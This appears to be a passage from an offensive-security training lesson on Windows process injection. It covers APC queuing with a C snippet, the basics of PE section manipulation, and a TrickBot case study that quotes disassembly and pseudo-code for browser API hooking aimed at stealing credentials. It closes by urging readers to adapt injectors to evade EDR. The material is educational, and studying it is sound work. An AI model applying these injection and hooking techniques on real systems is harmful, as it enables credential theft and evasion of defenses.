<p>An APC function is queued to a thread through <code>QueueUserAPC</code>. Once queued the APC function results in a software interrupt and executes the function the next time the thread is scheduled.</p>
<p>In order for a userland/user-mode application to queue an APC function the thread must be in an “<i>alertable state</i>”. An alertable state requires the thread to be waiting for a callback such as <code>WaitForSingleObject</code> or <code>Sleep</code>.</p>
<p>Now that we understand what APC functions are let's look at how they can be used maliciously! We will use <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code> for allocating and writing to memory.</p>
<pre><code class="language-c">QueueUserAPC(
	(PAPCFUNC)addressPointer, // APC function pointer to allocated memory defined by winnt
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	(ULONG_PTR)NULL
	);
ResumeThread(
	pinfo.hThread // Handle to thread from PROCESS_INFORMATION structure
);
WaitForSingleObject(
	pinfo.hThread, // Handle to thread from PROCESS_INFORMATION structure
	INFINITE // Wait infinitely until alerted
);
</code></pre>
<p>This technique is a great alternative to thread execution, but it has recently gained traction in detection engineering and specific traps are being implemented for APC abuse. This can still be a great option depending on the detection measures you are facing.</p>
<p>Section Manipulation</p>
<p>A commonly seen technique in malware research is PE (<strong>P</strong>ortable <strong>E</strong>xecutable) and section manipulation. As a refresher, the PE format defines the structure and formatting of an executable file in Windows. For execution purposes, we are mainly focused on the sections, specifically <code>.data</code> and <code>.text</code>, tables and pointers to sections are also commonly used to execute data.</p>
<p>We will not go in-depth with these techniques since they are complex and require a large technical breakdown, but we will discuss their basic principles.</p>
<p>To begin with any section manipulation technique, we need to obtain a PE dump. Obtaining a PE dump is commonly accomplished with a DLL or other malicious file fed into <code>xxd</code>.</p>
<p>At the core of each method, it is using math to move through the physical hex data which is translated to PE data.</p>
<p>Some of the more commonly known techniques include RVA entry point parsing, section mapping, and relocation table parsing.</p>
<p>With all injection techniques, the ability to mix and match commonly researched methods is endless. This provides you as an attacker with a plethora of options to manipulate your malicious data and execute it.</p>
<h1>Case Study in Browser Injection and Hooking</h1>
<p>To get hands on with the implications of process injection we can observe the TTPs (<strong>T</strong>actics,&nbsp;<strong>T</strong>echniques, and&nbsp;<strong>P</strong>rocedures) of TrickBot.</p>
<p>Credit for initial research: <a href="https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/"><i>SentinelLabs</i></a></p>
<p>TrickBot is a well known banking malware that has recently regained popularity in financial crimeware. The main function of the malware we will be observing is browser hooking. Browser hooking allows the malware to hook interesting API calls that can be used to intercept/steal credentials.</p>
<p>To begin our analysis, let’s look at how they’re targeting browsers. From <i>SentinelLab’s</i> reverse engineering, it is clear that <code>OpenProcess</code> is being used to obtain handles for common browser paths; seen in the disassembly below.</p>
<pre><code class="language-plaintext">push   eax
push   0
push   438h
call   ds:OpenProcess
mov    edi, eax
mov    [edp,hProcess], edi
test   edi, edi
jz     loc_100045EE</code></pre>
<pre><code class="language-plaintext">push   offset Srch            ; "chrome.exe"
lea    eax, [ebp+pe.szExeFile]
...
mov    eax, ecx
push   offset aIexplore_exe   ; "iexplore.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aFirefox_exe   ; "firefox.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
...</code></pre>
<p>The current source code for the reflective injection is unclear but <i>SentinelLabs</i> has outlined the basic program flow of the injection below.</p>
<ol>
  <li>Open Target Process, <code>OpenProcess</code></li>
  <li>Allocate memory, <code>VirtualAllocEx</code></li>
  <li>Copy function into allocated memory, <code>WriteProcessMemory</code></li>
  <li>Copy shellcode into allocated memory, <code>WriteProcessMemory</code></li>
  <li>Flush cache to commit changes, <code>FlushInstructionCache</code></li>
  <li>Create a remote thread, <code>RemoteThread</code></li>
  <li>Resume the thread or fallback to create a new user thread, <code>ResumeThread</code> or <code>RtlCreateUserThread</code></li>
</ol>
<p>Once injected TrickBot will call its <i>hook installer function</i> copied into memory at step three. Pseudo-code for the installer function has been provided by <i>SentinelLabs</i> below.</p>
<pre><code class="language-cpp">relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
v8 = (unsigned __int8)original_function[5];
trampoline_lpvoid = *(void **)(original_function + 1);
jmp_32_bit_relative_offset_opcode = 0xE9u;		// "0xE9" -&gt; opcode for a jump with a 32bit relative offset

if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &amp;flOldProtect) )	// Set up the function for "PAGE_EXECUTE_READWRITE" w/ VirtualProtectEx
{
	v10 = *(_DWORD *)(original_function + 1);
	v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
	original_function[66] = 0xE9u;
	*(_DWORD *)(original_function + 0x43) = v10 + v11;
	write_hook_iter(v10, &amp;jmp_32_bit_relative_offset_opcode, 5); // -&gt; Manually write the hook
	VirtualProtectEx(		// Return to original protect state
		(HANDLE)0xFFFFFFFF,
		*(LPVOID *)(original_function + 1),
		(unsigned __int8)original_function[5],
		flOldProtect,
		&amp;flOldProtect);
result = 1;</code></pre>
<p>Let’s break this code down, it may seem daunting at first, but it can be broken down into smaller sections of knowledge we have gained throughout this room.</p>
<p>The first section of interesting code we see can be identified as function pointers; you may recall this from the previous task on invoking function pointers.</p>
<pre><code class="language-cpp">relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;
v8 = (unsigned __int8)original_function[5];
trampoline_lpvoid = *(void **)(original_function + 1);
</code></pre>
<p>Once function pointers are defined the malware will use them to modify the memory protections of the function using <code>VirtualProtectEx</code>.</p>
<pre><code class="language-cpp">if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u, &amp;flOldProtect) )
</code></pre>
<p>At this point, the code turns into malware funny business with function pointer hooking. It is not essential to understand the technical requirements of this code for this room. At its bare bones, this code section will rewrite a hook to point to an opcode jump.</p>
<pre><code class="language-cpp">v10 = *(_DWORD *)(original_function + 1);
v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;
original_function[66] = 0xE9u;
*(_DWORD *)(original_function + 0x43) = v10 + v11;
write_hook_iter(v10, &amp;jmp_32_bit_relative_offset_opcode, 5); // -&gt; Manually write the hook</code></pre>
<p>Once hooked it will return the function to its original memory protections.</p>
<pre><code class="language-cpp">VirtualProtectEx(		// Return to original protect state
		(HANDLE)0xFFFFFFFF,
		*(LPVOID *)(original_function + 1),
		(unsigned __int8)original_function[5],
		flOldProtect,
		&amp;flOldProtect);</code></pre>
<p>This may still seem like a lot of code and technical knowledge being thrown and that is okay! The main takeaway of the hooking function for TrickBot is that it will inject itself into browser processes using reflective injection and hook API calls from the injected function.</p>
<h1>Conclusion</h1>
<p>Process injection is an overarching technique that can be used in many varieties and is one of the most common cases of abusing Windows Internals.</p>
<p>It is important to note that as detection engineering and monitoring evolves injection techniques will need to evolve as well. Most of the techniques shown in this room will be detected by popular commercial EDRs but you can still easily modify your injectors to meet the cat and mouse game between the red and blue team.</p>
<p>When preparing to incorporate an injection technique into your own work or tools we advise that you use it as only a small section of a larger tool. Mixing and matching components of injection can also be very fruitful to attempt to make your tooling as close to a legitimate application as possible.</p>
<p>Add these techniques to your evasion toolbox and continue experimenting to identify what works best for the environment you are in.</p>
<p>&nbsp;</p>
